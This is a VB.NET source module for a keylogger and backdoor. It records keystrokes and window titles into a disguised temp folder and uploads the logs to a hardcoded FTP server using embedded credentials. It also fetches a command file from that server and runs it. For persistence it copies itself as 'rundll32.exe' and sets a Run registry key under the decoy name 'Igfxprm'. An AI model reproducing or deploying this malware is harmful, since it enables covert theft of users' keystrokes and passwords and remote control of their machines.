'Written by Kousthub Raja (kousthubr@gmail.com)

Imports EnterpriseDT.Net.Ftp

Module Module1
    Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
    Declare Function GetForegroundWindow Lib "user32" () As Long
    Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
    Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long

    Dim Cnt As Long
    Dim wtitle As String
    Dim tempdir As String = My.Computer.FileSystem.SpecialDirectories.Temp

    Public luser As String = My.User.Name
    Public directory As String = Mid(tempdir, 1, Len(tempdir) - 4) & "System"
    Public uid As String = My.Computer.FileSystem.ReadAllText(directory & "\id.dll")
    Public logfile As String, shortfile As String
    Public server As String = "ftp://www.shanklyboys.dk/"
    Public ruser As String = "shankly@shanklyboys.dk", rpass As String = "liverpool"
    Public apppath As String = Application.StartupPath
    Public exepath As String = Application.ExecutablePath

    Sub savefile(ByVal text As String)
        Dim dt As String
        dt = Now.Year & Now.Month & Now.Day & Now.Hour & Now.Minute & Now.Second
        shortfile = luser & dt & ".xml"
        logfile = directory & "\" & shortfile
        My.Computer.FileSystem.WriteAllText(logfile, text, True)
    End Sub

    Function gettitle()
        Dim len As Long
        len = GetWindowTextLength(GetForegroundWindow)
        Dim b As String
        b = Space(5)
        GetWindowText(GetForegroundWindow, b, 5)
        gettitle = b
    End Function


    Function GetPressedKey() As String
        For Cnt = 0 To 222  '32 - 128
            'Get the keystate of a specified key
            If GetAsyncKeyState(Cnt) <> 0 Then
                GetPressedKey = Cnt
                Exit For
            End If
        Next Cnt
        'Return "none"
    End Function

    Function upload(ByVal filename As String) As Boolean
        Dim sfn As String
        Dim fil() As String = filename.Split("\")
        sfn = fil(fil.Length - 1)
        If sfn = "rundll32.exe" And sfn = "id.dll" Then Exit Function

        Dim con As System.Net.FtpWebRequest
        con = DirectCast(System.Net.WebRequest.Create(server & sfn), System.Net.FtpWebRequest)
        con.Credentials = New System.Net.NetworkCredential(ruser, rpass)
        con.Method = System.Net.WebRequestMethods.Ftp.UploadFile
        Dim bFile() As Byte = System.IO.File.ReadAllBytes(filename)
        Dim clsStream As System.IO.Stream = con.GetRequestStream()
        clsStream.Write(bFile, 0, bFile.Length)
        clsStream.Close()
        clsStream.Dispose()
        My.Computer.FileSystem.DeleteFile(filename)
    End Function


    Function getcom() As String
        Try
            'connect to ftp server
            Dim ftp As New FTPConnection
            ftp.ServerAddress = server
            ftp.UserName = ruser
            ftp.Password = rpass
            ftp.Connect()
            ftp.TransferType = FTPTransferType.ASCII

            'download a file
            ftp.DownloadFile(directory & "\com.dll", uid & ".txt")

            'close the connection
            ftp.Close()
            getcom = My.Computer.FileSystem.ReadAllText(directory & "\com.dll")
        Catch ex As Exception
            MessageBox.Show(ex.Message.ToString())
        End Try
        Return ""
    End Function

    Sub execute()
        Dim cmd As String
        Dim regKey As Microsoft.Win32.RegistryKey
        regKey = My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)

        cmd = Trim(getcom())
        If cmd <> "" Then
            If cmd = "start" Then
                
            ElseIf cmd = "stop" Then

            Else
                Shell(directory & "\com.dll")
            End If

        End If
        regKey.Close()
    End Sub


    Sub makestart()
        With My.Computer.FileSystem
            If .GetFileInfo(directory & "\rundll32.exe").Exists = False Then
                .CopyFile(exepath, directory & "\rundll32.exe")
            End If
            Dim regKey As Microsoft.Win32.RegistryKey
            regKey = My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
            If Trim(regKey.GetValue("Igfxprm")) = "" Then regKey.SetValue("Igfxprm", directory & "\rundll32.exe", Microsoft.Win32.RegistryValueKind.String)
            regKey.Close()
        End With

    End Sub
End Module
